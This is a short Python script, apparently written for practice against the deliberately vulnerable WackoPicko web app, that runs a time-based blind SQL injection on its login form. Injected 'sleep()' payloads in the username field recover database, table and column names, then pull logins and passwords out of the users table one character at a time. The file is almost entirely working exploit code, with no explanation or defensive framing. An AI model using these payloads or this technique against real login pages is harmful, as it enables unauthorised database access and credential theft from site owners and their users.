#!/usr/bin/python3
# For WackoPicko in vulnerablewebapps.org

import requests,string,time
from pwn import *

charset = string.printable + string.digits + " " + string.punctuation + string.ascii_letters

url = "http://192.168.0.9:81/users/login.php"
headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}

log.info('Starting injection on ' + url)
time.sleep(1)

result = ""
i = 0

p1 = log.progress('Obtaining database information')

while True:
    i += 1
    for c in charset:
        p1.status(result + c)
        #payload ="username=' or if(((select substr(group_concat(schema_name)," + str(i) + ",1) from information_schema.schemata)='" + c + "'), sleep(0.1), '');-- -&password="
        #payload ="username=' or if(((select substr(group_concat(table_name)," + str(i) + ",1) from information_schema.tables where table_schema='wackopicko')='" + c + "'), sleep(0.1), '');-- -&password="
        #payload ="username=' or if(((select substr(group_concat(column_name)," + str(i) + ",1) from information_schema.columns where table_name='users' and table_schema='wackopicko')='" + c + "'), sleep(0.1), '');-- -&password="
        payload ="username=' or if(((select substr(group_concat(login,0x3a,password)," + str(i) + ",1) from users)='" + c + "'), sleep(0.1), '');-- -&password="
        
        start = time.time()
        try:
            r = requests.post(url, headers=headers, data=payload, timeout=0.1)
        except requests.exceptions.Timeout:
            pass
        end = time.time()
        if ((end - start) > 0.1):
            if c == "+" and result[-1] == " ":
                p1.success(result)
                exit()
            if c == "+":
                c = " "
            result += c
            c = ""
            break
